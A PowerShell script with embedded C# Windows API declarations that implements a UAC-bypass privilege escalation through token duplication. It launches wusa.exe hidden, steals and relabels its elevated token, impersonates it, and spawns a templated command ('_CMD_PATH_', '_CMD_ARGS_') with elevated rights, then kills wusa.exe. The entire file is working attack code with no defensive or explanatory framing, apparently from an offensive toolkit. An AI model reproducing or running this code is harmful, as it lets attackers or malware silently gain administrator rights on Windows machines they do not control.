    param(
		[Parameter(Mandatory = $True)]
		[String]$BinPath,
		[Parameter(Mandatory = $True)]
		[String]$ServiceName
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public uint dwProcessId;
		public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;
		public IntPtr lpSecurityDescriptor;
		public int bInheritHandle;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct TOKEN_MANDATORY_LABEL
	{
		public SID_AND_ATTRIBUTES Label;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SID_AND_ATTRIBUTES
	{
		public IntPtr Sid;
		public UInt32 Attributes;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public uint dwX;
		public uint dwY;
		public uint dwXSize;
		public uint dwYSize;
		public uint dwXCountChars;
		public uint dwYCountChars;
		public uint dwFillAttribute;
		public uint dwFlags;
		public short wShowWindow;
		public short cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	public struct SID_IDENTIFIER_AUTHORITY 
	{
	[MarshalAs(UnmanagedType.ByValArray, SizeConst=6)]
	public byte[] Value;
	public SID_IDENTIFIER_AUTHORITY(byte[] value)
	{
		Value = value;
	}
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SHELLEXECUTEINFO
	{
		public int cbSize;
		public uint fMask;
		public IntPtr hwnd;
		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpVerb;
		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpFile;
		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpParameters;
		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpDirectory;
		public int nShow;
		public IntPtr hInstApp;
		public IntPtr lpIDList;
		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpClass;
		public IntPtr hkeyClass;
		public uint dwHotKey;
		public IntPtr hIcon;
		public IntPtr hProcess;
	}
	public static class UACTokenMagic
	{
		[DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
	
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr CreateFile(
			String lpFileName,
			UInt32 dwDesiredAccess,
			UInt32 dwShareMode,
			IntPtr lpSecurityAttributes,
			UInt32 dwCreationDisposition,
			UInt32 dwFlagsAndAttributes,
			IntPtr hTemplateFile);
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(
			UInt32 processAccess,
			bool bInheritHandle,
			int processId);
	
		[DllImport("advapi32.dll")]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
	
		[DllImport("advapi32.dll", CharSet=CharSet.Auto)]
		public extern static bool DuplicateTokenEx(
			IntPtr hExistingToken,
			uint dwDesiredAccess,
			ref SECURITY_ATTRIBUTES lpTokenAttributes,
			int ImpersonationLevel,
			int TokenType,
			ref IntPtr phNewToken);
	
		[DllImport("advapi32.dll")]
		public static extern bool AllocateAndInitializeSid(
			ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
			byte nSubAuthorityCount, 
			int dwSubAuthority0, int dwSubAuthority1, 
			int dwSubAuthority2, int dwSubAuthority3, 
			int dwSubAuthority4, int dwSubAuthority5, 
			int dwSubAuthority6, int dwSubAuthority7, 
			ref IntPtr pSid);
	
		[DllImport("ntdll.dll")]
		public static extern int NtSetInformationToken(
			IntPtr TokenHandle,
			int TokenInformationClass,
			ref TOKEN_MANDATORY_LABEL TokenInformation,
			int TokenInformationLength);
		[DllImport("ntdll.dll")]
		public static extern int NtFilterToken(
			IntPtr TokenHandle,
			UInt32 Flags,
			IntPtr SidsToDisable,
			IntPtr PrivilegesToDelete,
			IntPtr RestrictedSids,
			ref IntPtr hToken);
	
		[DllImport("advapi32.dll")]
		public static extern bool ImpersonateLoggedOnUser(
			IntPtr hToken);
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);
	
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		public static extern bool ShellExecuteEx(
			ref SHELLEXECUTEINFO lpExecInfo);
	}
"@
	$ShellExecuteInfo = New-Object SHELLEXECUTEINFO
	$ShellExecuteInfo.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($ShellExecuteInfo)
	$ShellExecuteInfo.fMask = 0x40
	$ShellExecuteInfo.lpFile = "wusa.exe"
	$ShellExecuteInfo.nShow = 0x0

	if ([UACTokenMagic]::ShellExecuteEx([ref]$ShellExecuteInfo)) {
		$hProcess = $ShellExecuteInfo.hProcess
	} else {
		Break
	}
	$hToken = [IntPtr]::Zero
	if ([UACTokenMagic]::OpenProcessToken($hProcess,0x02000000,[ref]$hToken)) {
	} else {
		Break
	}
	$hNewToken = [IntPtr]::Zero
	$SECURITY_ATTRIBUTES = New-Object SECURITY_ATTRIBUTES
	if ([UACTokenMagic]::DuplicateTokenEx($hToken,0xf01ff,[ref]$SECURITY_ATTRIBUTES,2,1,[ref]$hNewToken)) {
	} else {
		Break
	}
	$SID_IDENTIFIER_AUTHORITY = New-Object SID_IDENTIFIER_AUTHORITY
	$SID_IDENTIFIER_AUTHORITY.Value = [Byte[]](0x0,0x0,0x0,0x0,0x0,0x10)
	$pSID = [IntPtr]::Zero
	if ([UACTokenMagic]::AllocateAndInitializeSid([ref]$SID_IDENTIFIER_AUTHORITY,1,0x2000,0,0,0,0,0,0,0,[ref]$pSID)) {
	} else {
		Break
	}
	$SID_AND_ATTRIBUTES = New-Object SID_AND_ATTRIBUTES
	$SID_AND_ATTRIBUTES.Sid = $pSID
	$SID_AND_ATTRIBUTES.Attributes = 0x20
	$TOKEN_MANDATORY_LABEL = New-Object TOKEN_MANDATORY_LABEL
	$TOKEN_MANDATORY_LABEL.Label = $SID_AND_ATTRIBUTES
	$TOKEN_MANDATORY_LABEL_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL)
	if([UACTokenMagic]::NtSetInformationToken($hNewToken,25,[ref]$TOKEN_MANDATORY_LABEL,$($TOKEN_MANDATORY_LABEL_SIZE)) -eq 0) {
	} else {
		Break
	}
	$LUAToken = [IntPtr]::Zero
	if([UACTokenMagic]::NtFilterToken($hNewToken,4,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[ref]$LUAToken) -eq 0) {
	} else {
		Break
	}
	$hNewToken = [IntPtr]::Zero
	$SECURITY_ATTRIBUTES = New-Object SECURITY_ATTRIBUTES
	if ([UACTokenMagic]::DuplicateTokenEx($LUAToken,0xc,[ref]$SECURITY_ATTRIBUTES,2,2,[ref]$hNewToken)) {
	} else {
		Break
	}
	if([UACTokenMagic]::ImpersonateLoggedOnUser($hNewToken)) {
	} else {
		Break
	}
	$StartupInfo = New-Object STARTUPINFO
	$StartupInfo.dwFlags = 0x00000001
	$StartupInfo.wShowWindow = 0x0001
	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
	$ProcessInfo = New-Object PROCESS_INFORMATION
	$CurrentDirectory = $Env:SystemRoot
	if ([UACTokenMagic]::CreateProcessWithLogonW("aaa", "bbb", "ccc", 0x00000002, "_CMD_PATH_", "_CMD_ARGS_", 0x04000000, $null, $CurrentDirectory, [ref]$StartupInfo, [ref]$ProcessInfo)) {
	} else {
		Break
	}
	if (!$ProcPID) {
		$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)
	}
